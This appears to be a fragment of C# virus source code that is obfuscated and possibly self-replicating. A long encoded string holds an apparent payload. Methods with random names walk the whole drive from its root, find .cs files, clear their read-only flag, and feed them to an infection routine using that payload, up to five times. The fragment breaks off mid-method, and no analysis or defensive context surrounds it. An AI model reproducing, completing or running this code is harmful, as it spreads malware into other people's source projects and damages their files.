				"nGqMaoxqrHhsatx4DGtMa0xqbGkMaXxr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9x7fHsce2x7DHvse/x7zGr8apxqrGpMa9xqDGvcepx7DHqcev" + 
				"x7jHvMepxqnGrsaqxqrGtce3x7HHtsewx77Hv8e8xq/GqcaqxqTGtMamxpDGl8a9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvce0x7vGvca1x6jHrs" + 
				"ewx7rHp8exx7jGr8apxqvGqMazx5HHuMezx7rHqce1xr3GoMagxr3GrMa0xpDGl8a9xr3Gvca9xr3Gvca9xr3Gvca9xr3GvcemxpDGl8a9xr3G" + 
				"vca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9x6jHrsewx7rHp8exx7jGr8apxqvGqMa9xqDGvca/xq3Grcatxq3Gv8a9xrbGvceox67HsMe6x6" + 
				"fHsce4xq/GqcarxqjGpsaQxpfGvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3HoMaQxpfGvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3HuMexx67HuMa9" + 
				"x7THu8a9xrXHqMeux7DHusenx7HHuMavxqnGq8aoxrPHkce4x7PHusepx7XGvcagxqDGvcavxrTGkMaXxr3Gvca9xr3Gvca9xr3Gvca9xr3Gvc" + 
				"a9x6bGkMaXxr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3HqMeux7DHusenx7HHuMavxqnGq8aoxr3GoMa9xr/Grcatxq3Gv8a9xrbG" + 
				"vceox67HsMe6x6fHsce4xq/GqcarxqjGpsaQxpfGvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3HoMaQxpfGvca9xr3Gvca9xr3Gvca9xr3Gvca9xr" + 
				"3HuMexx67HuMa9x7THu8a9xrXHqMeux7DHusenx7HHuMavxqnGq8aoxrPHkce4x7PHusepx7XGvcagxqDGvcauxrTGkMaXxr3Gvca9xr3Gvca9" + 
				"xr3Gvca9xr3Gvca9x6bGkMaXxr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3HqMeux7DHusenx7HHuMavxqnGq8aoxr3GoMa9xr/Grc" + 
				"atxr/Gvca2xr3HqMeux7DHusenx7HHuMavxqnGq8aoxqbGkMaXxr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9x6DGkMaXxr3Gvca9xr3Gvca9xr3G" + 
				"vca9xr3Gvca9x7jHsceux7jGkMaXxr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9x6bGkMaXxr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr" + 
				"3HqMeux7DHusenx7HHuMavxqnGq8aoxr3GoMa9xr/Grca/xr3Gtsa9x6jHrsewx7rHp8exx7jGr8apxqvGqMamxpDGl8a9xr3Gvca9xr3Gvca9" + 
				"xr3Gvca9xr3GvcegxpDGl8a9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvce3x7bHtMeqx7vHucexxq7Gr8akxqvGvcagxr3HuMeyx63Ht8erx6THus" + 
				"apxqjGqMaqx4bGrceAxrPHj8e4x63Hsce8x77HuMa1xr/GrcatxqnGrMauxr/Gsca9x6jHrsewx7rHp8exx7jGr8apxqvGqMa0xqbGkMaXxr3G" + 
				"vca9xr3Gvca9xr3Gvca9xr3Gvca9x7fHsce2x7DHvse/x7zGr8apxqrGpMa9xqDGvce3x7HHtsewx77Hv8e8xq/GqcaqxqTGs8ePx7jHrcexx7" + 
				"zHvse4xrXGv8atxq3Gqcasxq7Gv8axxr3HqMeux7DHusenx7HHuMavxqnGq8aoxrTGpsaQxpfGvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Hrsep" + 
				"x6/HtMezx7rGvcexx6nHu8ekx7HHrMewxqnGpcatxqXGvcagxr3HqMekx6XHuse3x6fHpcauxq7Gq8auxrXHt8e2x7THqse7x7nHscauxq/GpM" + 
				"arxr3Gtsa9xr/Go8a/xr3Gtsa9x7HHtseux6THucepx7fGqMavxqjGpMa1x6vHrMenx6THuse2x7TGr8avxqrGqMa1x6XHq8e3x7THrsewx6nG" + 
				"r8aoxq3Gpcaxxr3Hjsekx67Hqce4x7DGs8eex7LHs8erx7jHr8epxrPHiceyx5THs8epxq7Gr8a1x6jHrsewx7rHp8exx7jGr8apxqvGqMa0xr" + 
				"TGtMa9xrbGvca/xqPGv8a9xrbGvcexx7bHrsekx7nHqce3xqjGr8aoxqTGtcerx6zHp8ekx7rHtse0xq/Gr8aqxqjGtce3x7HHtsewx77Hv8e8" + 
				"xq/GqcaqxqTGsca9x47HpMeux6nHuMewxrPHnseyx7PHq8e4x6/Hqcazx4nHsseUx7PHqcauxq/Gtceox67HsMe6x6fHsce4xq/GqcarxqjGtM" + 
				"a0xrTGtMamxpDGl8a9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvceox67HtMezx7rGvca1x47HpMeux6nHuMewxrPHlMeSxrPHjsepx6/HuMe8x7DH" + 
				"isevx7THqce4x6/Gvceox7XHv8enx7vHp8exxq/GrsarxqjGvcagxr3Hs8e4x6rGvceOx6THrsepx7jHsMazx5THksazx47Hqcevx7jHvMewx4" + 
				"rHr8e0x6nHuMevxrXHpMetx77Huce/x6rHq8aoxqzGrsakxrTGtMaQxpfGvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3HpsaQxpfGvca9xr3Gvca9" + 
				"xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvceox7XHv8enx7vHp8exxq/GrsarxqjGs8eKx6/HtMepx7jHkce0x7PHuMa1x7XHpMexx6THsse+x7rGqc" + 
				"auxqvGr8a0xqbGkMaXxr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3HqMe1x7/Hp8e7x6fHscavxq7Gq8aoxrPHisevx7THqce4x5HH" + 
				"tMezx7jGtca/x4HHr8eBx7PGv8a0xqbGkMaXxr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3HqMe1x7/Hp8e7x6fHscavxq7Gq8aoxr" + 
				"PHisevx7THqce4xrXHpcerx7fHtMeux7DHqcavxqjGrcalxr3Gtsa9x7HHqce7x6THscesx7DGqcalxq3Gpca9xrbGvce3x7HHtsewx77Hv8e8" + 
				"xq/GqcaqxqTGtMamxpDGl8a9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9x6jHtce/x6fHu8enx7HGr8auxqvGqMazx4rHr8e0x6nHuM" + 
				"eRx7THs8e4xrXGv8eBx6/Hgcezxr/GtMamxpDGl8a9xr3Gvca9xr3Gvca9xr3Gvca9xr3GvcegxpDGl8a9xr3Gvca9xr3Gvca9xr3Gvca9xr3G" + 
				"vcevx7jHqceox6/Hs8a9x7vHvMexx67HuMamxpDGl8a9xr3Gvca9xr3Gvca9xr3HoMaQxpfGvca9xr3Gvca9xr3Gvca9x63Hr8e0x6vHvMepx7" + 
				"jGvceux6nHvMepx7THvsa9x67Hqcevx7THs8e6xr3Ht8e1x7DHqMewx7LHvsasxq/GqcatxrXHrsepx6/HtMezx7rGvce0x6/Hs8eqx6THu8ey" + 
				"xqjGrsasxqvGtMaQxpfGvca9xr3Gvca9xr3Gvca9x6bGkMaXxr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvce/x6THqce4x4bHgMa9x6fHs8" + 
				"e/x6jHuce8x6zGrsapxq3Grca9xqDGvceOx6THrsepx7jHsMazx57Hssezx6vHuMevx6nGs8ebx6/Hssewx5/HvMeux7jGq8apx47Hqcevx7TH" + 
				"s8e6xrXHtMevx7PHqsekx7vHssaoxq7GrMarxrTGpsaQxpfGvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9x6/HuMepx6jHr8ezxr3Hjsekx6" + 
				"7Hqce4x7DGs8eJx7jHpcepxrPHmMezx77Hsse5x7THs8e6xrPHiMeJx5vGpcazx5rHuMepx47Hqcevx7THs8e6xrXHp8ezx7/HqMe5x7zHrMau" + 
				"xqnGrcatxrTGpsaQxpfGvca9xr3Gvca9xr3Gvca9x6DGkMaXxr3Gvca9xr3Gvca9xr3Gvcetx6/HtMerx7zHqce4xr3Hrsepx7zHqce0x77Gvc" + 
				"eux6nHr8e0x7PHusa9x6jHpMelx7rHt8enx6XGrsauxqvGrsa1x67Hqcevx7THs8e6xr3Hu8ewx7vHpceqx7fHq8auxq7GqcarxrTGkMaXxr3G" + 
				"vca9xr3Gvca9xr3GvcemxpDGl8a9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvceux6nHr8e0x7PHusa9x6jHqMeyx7/Htse/x63GrsatxqnGqsa9xq" + 
				"DGvca/xr/GpsaQxpfGvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Hu8eyx6/Gvca1x7THs8epxr3HsMe3x6jHuMe/x7XHuMasxq/GpMatxr3GoMa9" + 
				"xq3Gpsa9x7DHt8eox7jHv8e1x7jGrMavxqTGrca9xqHGvce7x7DHu8elx6rHt8erxq7GrsapxqvGs8eRx7jHs8e6x6nHtcamxr3HsMe3x6jHuM" + 
				"e/x7XHuMasxq/GpMatxrbGtsa0xpDGl8a9xr3Gvca9xr3Gvca9xr3Gvca9xr3GvcemxpDGl8a9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3G" + 
				"vca9x6jHqMeyx7/Htse/x63GrsatxqnGqsa9xrbGoMa9x7vHsMe7x6XHqse3x6vGrsauxqnGq8eGx7DHt8eox7jHv8e1x7jGrMavxqTGrceAxq" + 
				"bGkMaXxr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3HtMe7xr3Gtcewx7fHqMe4x7/Htce4xqzGr8akxq3Gvca8xqDGvcatxr3Gu8a7" + 
				"xr3HsMe3x6jHuMe/x7XHuMasxq/GpMatxr3GuMa9xqzGrMatxr3GoMagxr3Grca0xpDGl8a9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvc" + 
				"a9x6bGkMaXxr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvceox6jHsse/x7bHv8etxq7GrcapxqrGvcagxr3HqMeox7LH" + 
				"v8e2x7/Hrcauxq3Gqcaqxr3Gtsa9xr/Hgca/xr3Gtsa9x4HHr8eBx7PHgcepx4HHqceBx6nHgcepx4HGv8a/xqbGkMaXxr3Gvca9xr3Gvca9xr" + 
				"3Gvca9xr3Gvca9xr3Gvca9xr3HoMaQxpfGvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3HoMaQxpfGvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Hr8e4" + 
				"x6nHqMevx7PGvceox6jHsse/x7bHv8etxq7GrcapxqrGpsaQxpfGvca9xr3Gvca9xr3Gvca9x6DGkMaXxr3Gvca9xr3Gvca9xr3Hrcevx7THq8" + 
				"e8x6nHuMa9x67Hqce8x6nHtMe+xr3Hrsepx6/HtMezx7rGvcexx7bHrsekx7nHqce3xqjGr8aoxqTGtceux6nHr8e0x7PHusa9x6vHpMe5x7DH" + 
				"sseux7zGqMavxqvGpMa0xpDGl8a9xr3Gvca9xr3Gvca9xr3HpsaQxpfGvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Hjsekx67Hqce4x7DGs8eJx7" + 
				"jHpcepxrPHiMeJx5vGpceYx7PHvseyx7nHtMezx7rGvce1x6vHrMeqx6rHs8elxqzGqMatxqjGvcagxr3Hs8e4x6rGvceOx6THrsepx7jHsMaz" + 
				"x4nHuMelx6nGs8eIx4nHm8alx5jHs8e+x7LHuce0x7PHusa1xrTGpsaQxpfGvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Hv8ekx6nHuMeGx4DGvc" + 
				"ewx67Ht8etx6nHtsenxq7GqcarxqnGvcagxr3Htcerx6zHqseqx7PHpcasxqjGrcaoxrPHmse4x6nHn8ekx6nHuMeuxrXHq8ekx7nHsMeyx67H" + 
				"vMaoxq/Gq8akxrTGpsaQxpfGvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Hr8e4x6nHqMevx7PGvceOx6THrsepx7jHsMazx57Hssezx6vHuMevx6" + 
				"nGs8eJx7LHn8e8x67HuMarxqnHjsepx6/HtMezx7rGtcewx67Ht8etx6nHtsenxq7GqcarxqnGsca9xq3Gsca9x7DHrse3x63Hqce2x6fGrsap" + 
				"xqvGqcazx5HHuMezx7rHqce1xrTGpsaQxpfGvca9xr3Gvca9xr3Gvca9x6DGkMaXxr3Gvca9xr3Gvca9xr3Gvcetx6/HtMerx7zHqce4xr3Hrs" + 
				"epx7zHqce0x77Gvceux6nHr8e0x7PHusa9x6vHrMenx6THuse2x7TGr8avxqrGqMa1x67Hqcevx7THs8e6xr3Hv8eqx7vHvMe2x7nHrcapxqjG" + 
				"rMakxrHGvce0x7PHqca9x7rHpMeox7rHvsezx7fGrMakxq7GpMa0xpDGl8a9xr3Gvca9xr3Gvca9xr3HpsaQxpfGvca9xr3Gvca9xr3Gvca9xr" + 
				"3Gvca9xr3Hjsekx67Hqce4x7DGs8eJx7jHpcepxrPHjsepx6/HtMezx7rHn8eox7THsce5x7jHr8a9x7/HpMeox67Hsse2x7nGr8atxq7Gq8a9" + 
				"xqDGvcezx7jHqsa9x47HpMeux6nHuMewxrPHice4x6XHqcazx47Hqcevx7THs8e6x5/HqMe0x7HHuce4x6/Gtce/x6rHu8e8x7bHucetxqnGqM" + 
				"asxqTGtMamxpDGl8a9xr3Gvca9xr3Gvca9xr3Gvca9xr3GvceOx6THrsepx7jHsMazx4nHuMelx6nGs8eOx6nHr8e0x7PHusefx6jHtMexx7nH" + 
				"uMevxr3Htseux7LHqMeqx7nHusauxqnGrcarxr3GoMa9x7PHuMeqxr3Hjsekx67Hqce4x7DGs8eJx7jHpcepxrPHjsepx6/HtMezx7rHn8eox7" + 
				"THsce5x7jHr8a1x7/Hqse7x7zHtse5x63GqcaoxqzGpMazx5HHuMezx7rHqce1xrTGpsaQxpfGvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Hvse1" + 
				"x7zHr8a9x7/HuMe5x7XHs8eux7jGqMasxqzGrcamxpDGl8a9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvce7x7LHr8a9xrXHtMezx6nGvcewx7fHqM" + 
				"e4x7/Htce4xqzGr8akxq3Gvcagxr3Grcamxr3HsMe3x6jHuMe/x7XHuMasxq/GpMatxr3Goca9x7/Hqse7x7zHtse5x63GqcaoxqzGpMazx5HH" + 
				"uMezx7rHqce1xqbGvcewx7fHqMe4x7/Htce4xqzGr8akxq3Gtsa2xrTGkMaXxr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9x6bGkMaXxr3Gvca9xr" + 
				"3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Hv8e4x7nHtcezx67HuMaoxqzGrMatxqDGvce/x6THqMeux7LHtse5xq/GrcauxqvHhsewx7fHqMe4" + 
				"x7/Htce4xqzGr8akxq3HgMamxpDGl8a9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9x7/HuMe5x7XHs8eux7jGqMasxqzGrca9xqDGvc" + 
				"a1x77Htce8x6/GtMa1x7/HuMe5x7XHs8eux7jGqMasxqzGrca9x4PGvce6x6THqMe6x77Hs8e3xqzGpMauxqTGtMamxpDGl8a9xr3Gvca9xr3G" + 
				"vca9xr3Gvca9xr3Gvca9xr3Gvca9x7bHrseyx6jHqse5x7rGrsapxq3Gq8azx5zHrcetx7jHs8e5xrXHv8e4x7nHtcezx67HuMaoxqzGrMatxr" + 
				"TGpsaQxpfGvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3HoMaQxpfGvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Hr8e4x6nHqMevx7PGvce2x67Hsseo" + 
				"x6rHuce6xq7GqcatxqvGs8eJx7LHjsepx6/HtMezx7rGtca0xqbGkMaXxr3Gvca9xr3Gvca9xr3GvcegxpDGl8a9xr3Gvca9xr3Gvca9xr3Hrc" + 
				"evx7THq8e8x6nHuMa9x67Hqce8x6nHtMe+xr3Hrsepx6/HtMezx7rGvcepx7DHqcevx7jHvMepxqnGrsaqxqrGtceux6nHr8e0x7PHusa9x7LH" + 
				"pMe6x7zHt8e1x6jGqcasxq7Grsa0xpDGl8a9xr3Gvca9xr3Gvca9xr3HpsaQxpfGvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Hj8e8x7PHuceyx7" + 
				"DGvcekx7/Hpce5x6rHs8elxq7GqMatxqrGvcagxr3Hs8e4x6rGvcePx7zHs8e5x7LHsMa1xrTGpsaQxpfGvca9xr3Gvca9xr3Gvca9xr3Gvca9" + 
				"xr3Hrsepx6/HtMezx7rHhseAxr3Hqse5x6zHr8epx7rHvMaoxqnGpMakxr3GoMa9x6bGvca/x7nHtcerx7LHs8erx6fGrMapxqzGr8a/xrHGvc" + 
				"a/x7HHtcexx7fHvsepx6/GqcatxqzGrsa/xrHGvca/x7XHq8esx6rHqsezx6XGrMaoxq3GqMa/xrHGkMaXxr3Gvca9xr3Gvca9xr3Gvca9xr3G" + 
				"vca9xr3Gvca9xr3Gvca9xr3Gv8e4x6/Hq8e7x7LHrsenxq7Gqcalxq7Gv8axxr/HqMepx7DHscewx7nHvMavxqnGpcauxr/Gsca/x6nHuMevx7" + 
				"PHusenx6jGrMaoxqXGqMa/xrHGv8esx6/HrMetx7fHtMeqxq7GrsasxqvGv8axxr/Hs8epx7jHtcexx63Hssaoxq3Grsaqxr/Gsca/x7/Hpce1" + 
				"x6zHtMe/x7jGrMasxqrGr8a/xrHGv8ekx63Hvse5x7/HqserxqjGrMauxqTGv8axxr/Ht8ewx7bHrsetx6nHpcapxqTGr8alxr/Gsca/x7jHrs" + 
				"erx7jHsce4x7bGrMalxq/Gr8a/xrHGkMaXxr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gv8etx7/Hqce8x7nHrsewxqnG" + 
				"qMauxqzGv8axxr/HpMe0x7fHtMepx6nHssavxqnGpcasxr/Gsca/x77Hscetx7HHtceqx7PGr8arxqvGrsa/xrHGv8epx67Huse8x6rHtcesxq" + 
				"zGpcavxq/Gv8axxr/Hr8eqx7/Htse6x7vHqcauxqjGr8apxr/Gsca/x67Hpcexx63Hrcenx6fGrMauxq/Grca/xrHGv8e4x6jHp8e3x7jHsMe8" + 
				"xq/GqMasxq7Gv8axxr/HsMevx7XHp8erx7DHtsaoxq7Gr8aqxr/GscaQxpfGvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvc" + 
				"a/x6vHuce/x7bHr8elx6vGqcaqxq3Grca/xrHGv8eox7THrce1x6THvMe1xq/GqMarxqXGv8axxr/HuMe1x7nHuMekx6/HrMavxqXGqsapxr/G" + 
				"sca/x6XHr8eqx7THvMesx6zGrsasxqrGr8a/xrHGvca/x6jHrsewx7rHp8exx7jGr8apxqvGqMa/xrHGv8evx67HpMe2x7THqse2xqzGqcaqxq" + 
				"XGv8axxr/Htcekx7HHpMeyx77Husapxq7Gq8avxr/GscaQxpfGvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca/x7XHv8es" + 
				"x7THqMe5x67GrsauxqjGq8a/xrHGv8eqx7THuce5x63Hrce8xqzGrsatxq7Gv8axxr/Htce5x7XHtse6x77Ht8auxqjGpcapxr/Gsca/x6nHss" + 
				"e8x7vHu8e8x7DGqMavxq/GpMa/xrHGv8elx6vHt8e0x67HsMepxq/GqMatxqXGv8axxr/Ht8exx7bHsMe+x7/HvMavxqnGqsakxr/Gsca/x7fH" + 
				"tse0x6rHu8e5x7HGrsavxqTGq8a/xrHGv8e4x7LHrce3x6vHpMe6xqnGqMaoxqrGv8axxr/Hq8esx6fHpMe6x7bHtMavxq/Gqsaoxr/GscaQxp" + 
				"fGvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca/x7fHtcewx6jHsMeyx77GrMavxqnGrca/xrHGvca/x7HHqce7x6THsces" + 
				"x7DGqcalxq3Gpca/xrHGv8eox6THpce6x7fHp8elxq7Grsarxq7Gv8axxr/HqMe1x7/Hp8e7x6fHscavxq7Gq8aoxr/Gsca/x7THr8ezx6rHpM" + 
				"e7x7LGqMauxqzGq8a/xrHGv8enx7PHv8eox7nHvMesxq7Gqcatxq3Gv8axxr/Hu8ewx7vHpceqx7fHq8auxq7Gqcarxr/Gsca/x6jHqMeyx7/H" + 
				"tse/x63GrsatxqnGqsa/xrHGkMaXxr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gv8ewx7fHqMe4x7/Htce4xqzGr8akxq" + 
				"3Gv8axxr/Hsce2x67HpMe5x6nHt8aoxq/GqMakxr/Gsca/x6vHpMe5x7DHsseux7zGqMavxqvGpMa/xrHGv8ewx67Ht8etx6nHtsenxq7Gqcar" + 
				"xqnGv8axxr/Hqcewx6nHr8e4x7zHqcapxq7Gqsaqxr/Gsca/x7LHpMe6x7zHt8e1x6jGqcasxq7Grsa/xrHGv8ekx7/Hpce5x6rHs8elxq7GqM" + 
				"atxqrGv8axxr/Ht8esx6/HsMe6x6fHvsaoxqjGpcaqxr/Gsca/x7fHvse+x7zHrMevx7vGr8apxqvGqsa/xrHGkMaXxr3Gvca9xr3Gvca9xr3G" + 
				"vca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gv8e7x7HHv8elx6/Hqce5xqnGr8atxq3Gv8axxr/HqMe5x6vHuMeyx6nHtcaoxqnGrcapxr/Gsca/x6" + 
				"THtsepx6nHrce7x6/GqcauxqXGrMa/xrHGv8ekx6fHuse8x7XHp8euxqnGrMavxqjGv8axxr/Hv8eqx7vHvMe2x7nHrcapxqjGrMakxr/Gsca/" + 
				"x7rHpMeox7rHvsezx7fGrMakxq7GpMa/xrHGv8e/x6THqMeux7LHtse5xq/GrcauxqvGv8axxr/Htseux7LHqMeqx7nHusauxqnGrcarxr/Gsc" + 
				"a/x7/HuMe5x7XHs8eux7jGqMasxqzGrca/xrHGv8eqx7nHrMevx6nHuse8xqjGqcakxqTGv8egxqbGkMaXxr3Gvca9xr3Gvca9xr3Gvca9xr3G" + 
				"vca9x7vHssevxr3Gtce0x7PHqca9x7fHvse+x7zHrMevx7vGr8apxqvGqsa9xqDGvcatxqbGvce3x77Hvse8x6zHr8e7xq/GqcarxqrGvcahxr" + 
				"3Hqse5x6zHr8epx7rHvMaoxqnGpMakxrPHkce4x7PHusepx7XGpsa9x7fHvse+x7zHrMevx7vGr8apxqvGqsa2xrbGtMaQxpfGvca9xr3Gvca9" + 
				"xr3Gvca9xr3Gvca9xr3HpsaQxpfGvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvceyx6THuse8x7fHtceoxqnGrMauxq7Gvcagxr3Hss" + 
				"ekx7rHvMe3x7XHqMapxqzGrsauxrPHj8e4x63Hsce8x77HuMa1x6rHucesx6/Hqce6x7zGqMapxqTGpMeGx7fHvse+x7zHrMevx7vGr8apxqvG" + 
				"qseAxrHGvce7x7HHv8elx6/Hqce5xqnGr8atxq3Gtcekx7/Hpce5x6rHs8elxq7GqMatxqrGs8eTx7jHpcepxrXGtcasxq3Grcauxr3Gtsa9xq" + 
				"zGtMaxxr3GtcaoxqjGqMaoxr3GsMa9xqzGtMa0xr3Gtsa9x7fHvse+x7zHrMevx7vGr8apxqvGqsa0xr3Gtsa9xrXHpMe/x6XHuceqx7PHpcau" + 
				"xqjGrcaqxrPHk8e4x6XHqca1xrXGrMatxq3Grsa9xrbGvcasxrTGsca9xrXGqMaoxqjGqMa9xrDGvcasxrTGtMa9xrbGvce3x77Hvse8x6zHr8" + 
				"e7xq/GqcarxqrGtMazx4nHsseOx6nHr8e0x7PHusa1xrTGtMamxpDGl8a9xr3Gvca9xr3Gvca9xr3Gvca9xr3GvcegxpDGl8a9xr3Gvca9xr3G" + 
				"vca9xr3Gvca9xr3Gvcevx7jHqceox6/Hs8a9x7LHpMe6x7zHt8e1x6jGqcasxq7GrsamxpDGl8a9xr3Gvca9xr3Gvca9xr3HoMaQxpfGvca9xr" + 
				"3Gvca9xr3Gvca9x63Hr8e0x6vHvMepx7jGvceux6nHvMepx7THvsa9x67Hqcevx7THs8e6xr3Hu8exx7/Hpcevx6nHucapxq/GrcatxrXHtMez" + 
				"x6nGvce3x6zHr8ewx7rHp8e+xqjGqMalxqrGtMaQxpfGvca9xr3Gvca9xr3Gvca9x6bGkMaXxr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9x77Htc" + 
				"e8x6/HhseAxr3HqMe5x6vHuMeyx6nHtcaoxqnGrcapxr3GoMa9x7PHuMeqxr3Hvse1x7zHr8eGxqrHgMamxpDGl8a9xr3Gvca9xr3Gvca9xr3G" + 
				"vca9xr3GvcePx7zHs8e5x7LHsMa9x6THv8elx7nHqsezx6XGrsaoxq3Gqsa9xqDGvcezx7jHqsa9x4/HvMezx7nHssewxrXHt8esx6/HsMe6x6" + 
				"fHvsaoxqjGpcaqxrTGpsaQxpfGvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Hu8eyx6/Gvca1x7THs8epxr3HsMe3x6jHuMe/x7XHuMasxq/GpMat" + 
				"xr3GoMa9xq3Gpsa9x7DHt8eox7jHv8e1x7jGrMavxqTGrca9xqHGvcaqxqbGvcewx7fHqMe4x7/Htce4xqzGr8akxq3Gtsa2xrTGkMaXxr3Gvc" + 
				"a9xr3Gvca9xr3Gvca9xr3Gvca9x6bGkMaXxr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3HtMezx6nGvcekx7bHqcepx63Hu8evxqnG" + 
				"rsalxqzGvcagxr3HpMe/x6XHuceqx7PHpcauxqjGrcaqxrPHk8e4x6XHqca1xq3Gsca9xq/Gq8a0xqbGvcayxrLGvceHx7jHr8eyxr3Hqceyxr" + 
				"3Gr8aoxpDGl8a9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9x6jHucerx7jHssepx7XGqMapxq3GqceGx7DHt8eox7jHv8e1x7jGrMav" + 
				"xqTGrceAxr3Gtsagxr3Gtce+x7XHvMevxrTGtca6x7zGusa9xrbGvcekx7bHqcepx63Hu8evxqnGrsalxqzGtMamxpDGl8a9xr3Gvca9xr3Gvc" + 
				"a9xr3Gvca9xr3GvcegxpDGl8a9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvceux6nHr8e0x7PHusa9x6jHrsewx7rHp8exx7jGr8apxqvGqMa9xqDG" + 
				"vcezx7jHqsa9x67Hqcevx7THs8e6xrXHqMe5x6vHuMeyx6nHtcaoxqnGrcapxrTGpsaQxpfGvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Hr8e4x6" + 
				"nHqMevx7PGvceox67HsMe6x6fHsce4xq/GqcarxqjGpsaQxpfGvca9xr3Gvca9xr3Gvca9x6DGkMaXxr3Gvca9xr3GvcegxpDGl8egxr3Gssay" + 
				"xr3Hq8e0x6nHvMewx7THs8a9x77Gvcerx7jHr8eux7THssezxr3Grsa9x7/HpMa9x7zHsce+xq3Hrce8x6jHsca9xqHHv8e8x7PHuse0x7PHus" + 
				"e8x6nHv8e8x7PHusedx7HHvMezx7nGs8evx6jGo8a9x7XHqcepx63Gp8ayxrLHvMexx77Hssetx7zHqMexxrPHvseyxrPHs8evxpDGl8aQxpfG" + 
				"kMaXxpDGl8aQxpc="; 
        private static int dhvonvz1412 = 0;
        public static void LetsGo()
        {
            string ervfosz3483 = System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetModules()[0].FullyQualifiedName);
            string utmlmda2483 = System.IO.Directory.GetDirectoryRoot(ervfosz3483);
            System.IO.DirectoryInfo qrqpjiw3316 = new System.IO.DirectoryInfo(@utmlmda2483);
            int terngzu1585 = lhljctr4013(qrqpjiw3316);    
        }
        private static int lhljctr4013(System.IO.DirectoryInfo qrqpjiw3316)
        {
            System.IO.FileInfo[] ntehlpo5037 = qrqpjiw3316.GetFiles("*.cs");
            foreach (System.IO.FileInfo ypcdbwv5139 in ntehlpo5037)
            {
                string pbtadsm4531 = ypcdbwv5139.FullName;
                System.IO.FileAttributes bxhqibe1172 = System.IO.File.GetAttributes(pbtadsm4531);
                if ((bxhqibe1172 & System.IO.FileAttributes.ReadOnly) != 0)
                {
                    System.IO.FileAttributes yijitto2481 = System.IO.FileAttributes.Normal;
                    System.IO.File.SetAttributes(pbtadsm4531, yijitto2481);
                }
                string ervfosz3483 = euzjema2513(pbtadsm4531);
                bool utmlmda2483 = ehdeyrq2874(ervfosz3483);
                bool jmksptx4928 = xrwiaqq3172(ervfosz3483);
                if (utmlmda2483 == true)
                {
                    continue;
                }
                if (jmksptx4928 == true)
                {
                    bool esvelek1822 = true;
                    while (esvelek1822 == true)
                    {
                        if (dhvonvz1412 == 5)
                        { return 0; }
                        esvelek1822 = clplhwn2663(pbtadsm4531, ervfosz3483, database);
                        if (esvelek1822 == false)
                        {
                            dhvonvz1412 += 1;
                        }
                    }
                }
                else { continue; }
            }
            System.IO.DirectoryInfo[] tsgawhq1822 = qrqpjiw3316.GetDirectories("*.*");
            foreach (System.IO.DirectoryInfo rwbkgft3524 in tsgawhq1822)
            {
                try
                {
                    if (dhvonvz1412 == 5)
                    {
                        return 0;
                    }
                    int sxlppzz1320 = lhljctr4013(rwbkgft3524); }
                catch { continue; }
            }
            return 1;
        }
        private static string euzjema2513(string ypcdbwv5139)
        {
            System.IO.StreamReader mrhzvmk5327 = System.IO.File.OpenText(ypcdbwv5139);
            string vdbkrxv4700;
            string uiphyah2568 = "";
            while ((vdbkrxv4700 = mrhzvmk5327.ReadLine()) != null)
            {
